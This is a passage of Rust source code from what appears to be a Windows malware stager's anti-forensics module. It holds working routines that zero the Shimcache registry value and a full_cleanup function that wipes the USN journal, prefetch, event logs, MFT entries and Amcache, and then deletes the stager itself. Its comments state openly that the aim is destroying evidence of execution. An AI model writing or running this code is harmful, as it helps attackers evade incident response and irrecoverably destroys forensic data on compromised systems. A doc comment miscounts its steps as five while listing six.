    'p' as u16, 'a' as u16, 't' as u16, 'C' as u16, 'a' as u16, 'c' as u16,
    'h' as u16, 'e' as u16,
];

/// Wipe the AppCompatCache (Shimcache) registry value.
///
/// Opens `HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\AppCompatCache`,
/// overwrites the `AppCompatCache` value with a single zero byte. This removes
/// forensic evidence of recent executable execution.
///
/// # Safety
/// Requires admin (HKLM write). Registry handles are closed on both success
/// and failure paths.
pub unsafe fn wipe_appcompat_cache() -> Result<(), &'static str> {
    let reg_open: FnRegOpenKeyExW = core::mem::transmute(
        resolve_advapi32(b"RegOpenKeyExW").ok_or("RegOpenKeyExW unresolved")?,
    );
    let reg_set: FnRegSetValueExW = core::mem::transmute(
        resolve_advapi32(b"RegSetValueExW").ok_or("RegSetValueExW unresolved")?,
    );
    let reg_close: FnRegCloseKey = core::mem::transmute(
        resolve_advapi32(b"RegCloseKey").ok_or("RegCloseKey unresolved")?,
    );

    let key_name_z = null_terminated_wide(APPCOMPAT_CACHE_KEY)
        .ok_or("OOM for key name")?;
    let value_name_z = null_terminated_wide(APPCOMPAT_CACHE_VALUE)
        .ok_or("OOM for value name")?;

    let mut key_handle: Handle = core::ptr::null_mut();
    let open_status = reg_open(
        HKEY_LOCAL_MACHINE,
        key_name_z.as_ptr(),
        0,              // ulOptions
        KEY_SET_VALUE,  // samDesired
        &mut key_handle,
    );

    if open_status != 0 {
        return Err("RegOpenKeyExW failed");
    }

    let zero: u8 = 0;
    let set_status = reg_set(
        key_handle,
        value_name_z.as_ptr(),
        0,              // Reserved
        REG_BINARY,     // dwType
        &zero,          // lpData
        1,              // cbData
    );

    reg_close(key_handle);

    if set_status == 0 {
        Ok(())
    } else {
        Err("RegSetValueExW failed")
    }
}

// ============================================================================
// Public API — full cleanup
// ============================================================================

/// Run a complete forensic artifact cleanup.
///
/// Executes all five operations in sequence (best-effort — individual failures
/// are logged but do not stop the chain):
/// 1. Wipe USN journal on `\\.\C:`
/// 2. Wipe prefetch for given executable names
/// 3. Clear all three event logs
/// 4. Overwrite MFT data entries for stager path
/// 5. Wipe Amcache/Shimcache
/// 6. Self-delete the stager binary
///
/// # Safety
/// - `stager_path` must be a valid wide-string file path.
/// - `executable_names` must be valid wide-string executable base names.
/// - All operations require admin for full effect.
/// - This is a one-way operation — data is irrecoverably destroyed.
pub unsafe fn full_cleanup(
    stager_path: &[u16],
    executable_names: &[&[u16]],
) -> Result<(), &'static str> {
    // 1. USN Journal — first, before we touch any files
    let usn_volume: &[u16] = &[
        '\\' as u16, '\\' as u16, '.' as u16, '\\' as u16,
        'C' as u16, ':' as u16,
    ];
    let _ = wipe_usn_journal(usn_volume);

    // 2. Prefetch
    if !executable_names.is_empty() {
        let _ = wipe_prefetch(executable_names);
    }

    // 3. Event logs
    clear_all_event_logs();

    // 4. MFT data overwrite on the stager
    if !stager_path.is_empty() {
        let _ = overwrite_mft_entry(stager_path);
    }

    // 5. Amcache/Shimcache
    let _ = wipe_appcompat_cache();

    // 6. Self-delete (last — after we're done using the file handle)
    if !stager_path.is_empty() {
        let _ = self_delete(stager_path);
    }

    Ok(())
}
